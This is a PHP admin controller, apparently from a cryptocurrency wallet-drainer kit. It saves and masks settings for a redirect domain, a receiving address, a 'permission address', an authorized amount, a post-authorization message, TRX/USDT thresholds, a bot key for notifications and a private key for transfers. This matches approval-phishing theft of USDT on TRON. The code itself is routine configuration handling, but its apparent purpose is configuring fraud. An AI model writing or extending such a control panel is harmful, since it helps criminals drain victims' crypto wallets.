<?php
namespace app\admin\controller;

use app\common\controller\Backend;
use think\Db;
use think\Response;

class Daou extends Backend 
{
    protected $noNeedLogin = [];
    protected $noNeedRight = [];
    
    protected $maskedFields = ['private_key', 'bot_key'];

    public function _initialize()
    {
        parent::_initialize();
        
        try {
            Db::query("SELECT 1");
        } catch (\Exception $e) {
            return $this->jsonResponse(0, "数据库连接失败：" . $e->getMessage());
        }
    }

    public function index()
    {
        try {
            $tables = Db::query("SHOW TABLES LIKE 'options'");
            if (empty($tables)) {
                throw new \Exception('options表不存在');
            }

            $config = Db::name('options')
                ->column('value', 'name');

            $defaultConfigs = [
                'domain' => '',
                'payment_address' => '',
                'permission_address' => '',
                'bot_key' => '',
                'notification_id' => '',
                'trx_balance' => '0',
                'usdt_balance' => '0',
                'authorized_amount' => '0',
                'authorize_note' => '',
                'model' => '4',
                'notification_switch' => '1',
                'private_key' => '',
                'auto_threshold' => '0',           // 新增：授权后自动添加阈值
                'contract_method' => '',           // 新增：合约方法名
                'need_usdt_contract' => '1'        // 新增：是否需要USDT合约地址 1需要 2不需要
            ];

            $config = array_merge($defaultConfigs, $config);
            
            foreach ($this->maskedFields as $field) {
                if(!empty($config[$field])) {
                    $config[$field.'_masked'] = $this->maskSensitiveData($config[$field]);
                }
            }

            $this->view->assign([
                'config' => $config,
                'title' => '系统设置'
            ]);

            return $this->view->fetch();

        } catch (\Exception $e) {
            return $this->jsonResponse(0, $e->getMessage());
        }
    }

    public function save()
    {
        if (!$this->request->isPost()) {
            return $this->jsonResponse(0, '请求方式错误');
        }

        Db::startTrans();
        try {
            $params = $this->request->post();
            
            $allowedConfigs = [
                'domain',
                'payment_address',
                'permission_address',
                'bot_key',
                'notification_id',
                'trx_balance',
                'usdt_balance',
                'authorized_amount',
                'authorize_note',
                'model',
                'notification_switch',
                'private_key',
                'auto_threshold',           // 新增：授权后自动添加阈值
                'contract_method',          // 新增：合约方法名
                'need_usdt_contract'        // 新增：是否需要USDT合约地址
            ];

            foreach ($params as $key => $value) {
                if (!in_array($key, $allowedConfigs)) {
                    continue;
                }
                // 添加auto_threshold到数值类型字段检查中
                if (in_array($key, ['trx_balance', 'usdt_balance', 'authorized_amount', 'auto_threshold'])) {
                    $value = (float)$value;
                }
                
                if (in_array($key, $this->maskedFields) && strpos($value, '******') !== false) {
                    continue;
                }
                
                $exist = Db::name('options')->where('name', $key)->find();
                
                if ($exist) {
                    Db::name('options')
                        ->where('name', $key)
                        ->update([
                            'value' => $value
                        ]);
                } else {
                    Db::name('options')->insert([
                        'name' => $key,
                        'value' => $value,
                        'remarks' => $this->getConfigRemark($key)
                    ]);
                }
            }
            
            Db::commit();
            return $this->jsonResponse(1, '保存成功');
            
        } catch (\Exception $e) {
            Db::rollback();
            return $this->jsonResponse(0, '保存失败：' . $e->getMessage());
        }
    }

    private function maskSensitiveData($value) 
    {
        if(strlen($value) <= 8) {
            return $value;
        }
        return substr($value, 0, 4) . '******' . substr($value, -4);
    }

    private function getConfigRemark($key)
    {
        $remarks = [
            'domain' => '跳转域名',
            'payment_address' => '收款地址',
            'permission_address' => '权限地址',
            'bot_key' => '机器人密钥',
            'notification_id' => '通知ID',
            'trx_balance' => 'TRX阈值',
            'usdt_balance' => 'USDT阈值',
            'authorized_amount' => '授权金额',
            'authorize_note' => '授权成功后提示',
            'model' => '授权模式选择',
            'notification_switch' => '通知开关',
            'private_key' => '转账私钥',
            'auto_threshold' => '授权后自动添加阈值', 
            'contract_method' => '合约方法名',       
            'need_usdt_contract' => 'USDT合约地址开关'
        ];
        return isset($remarks[$key]) ? $remarks[$key] : '';
    }

    protected function jsonResponse($code, $msg = '', $data = null)
    {
        return json([
            'code' => $code,
            'msg' => $msg,
            'data' => $data
        ])->header([
            'Content-Type' => 'application/json; charset=utf-8'
        ]);
    }
}